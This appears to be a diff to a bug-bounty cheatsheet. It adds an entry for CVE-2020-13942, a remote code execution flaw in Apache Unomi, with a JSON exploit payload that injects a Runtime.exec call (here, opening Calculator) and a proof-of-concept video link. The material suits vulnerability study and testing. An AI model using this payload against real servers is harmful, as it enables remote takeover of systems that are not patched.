@@ -65,3 +65,10 @@ DOM XSS via $.append(<PAYLOAD>)
 > ***https://github.com/EdOverflow/bugbounty-cheatsheet***
 ## Blind SQL Injection
 > ***https://hackerone.com/reports/1034625***
+
+📅 20-Nov-2020
+## CVE-2020-13942 Apache Unomi Remote Code Execution
+```json
+{"filters":[{"id" : "pyn3rd","filters": [{"condition": {"parameterValues": {"pyn3rd": "script::Runtime.getRuntime().exec('open -a Calculator')"},"type":"profilePropertyCondition"}}]}],"sessionId": "pyn3rd"}
+```
+- [Proof of Concept](img/-%20CVE-2020-13942%20Apache%20Unomi%20Remote%20Code%20Execution__PoC__%7B_filters___%7B_id_%20_%20_py.mp4)
